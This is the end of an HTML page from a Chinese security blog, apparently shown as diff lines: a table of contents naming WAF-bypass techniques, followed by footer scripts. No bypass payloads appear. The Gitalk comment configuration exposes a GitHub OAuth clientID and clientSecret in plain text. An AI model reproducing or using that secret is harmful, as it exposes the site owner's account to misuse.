href="#垃圾字符"><span class="nav-number">4.3.10.</span> <span class="nav-text">垃圾字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#换行符"><span class="nav-number">4.3.11.</span> <span class="nav-text">换行符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#未初始化的变量"><span class="nav-number">4.3.12.</span> <span class="nav-text">未初始化的变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#制表符和换行符"><span class="nav-number">4.3.13.</span> <span class="nav-text">制表符和换行符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#令牌破坏者"><span class="nav-number">4.3.14.</span> <span class="nav-text">令牌破坏者</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#burpsuit插件"><span class="nav-number">4.4.</span> <span class="nav-text">burpsuit插件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#X-Originating-IP"><span class="nav-number">4.4.1.</span> <span class="nav-text">X-Originating-IP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-type"><span class="nav-number">4.4.2.</span> <span class="nav-text">Content-type</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Host"><span class="nav-number">4.4.3.</span> <span class="nav-text">Host</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pathinfo"><span class="nav-number">4.4.4.</span> <span class="nav-text">Pathinfo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PathObfuscation"><span class="nav-number">4.4.5.</span> <span class="nav-text">PathObfuscation</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HPP"><span class="nav-number">4.4.6.</span> <span class="nav-text">HPP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SpaceEncoding"><span class="nav-number">4.4.7.</span> <span class="nav-text">SpaceEncoding</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过实战"><span class="nav-number">5.</span> <span class="nav-text">绕过实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#字符编码绕过WAF"><span class="nav-number">5.1.</span> <span class="nav-text">字符编码绕过WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编码绕过WAF"><span class="nav-number">5.2.</span> <span class="nav-text">编码绕过WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chunked-绕过WAF"><span class="nav-number">5.3.</span> <span class="nav-text">Chunked 绕过WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipline绕过WAF"><span class="nav-number">5.4.</span> <span class="nav-text">pipline绕过WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss编码绕过WAF"><span class="nav-number">5.5.</span> <span class="nav-text">xss编码绕过WAF</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
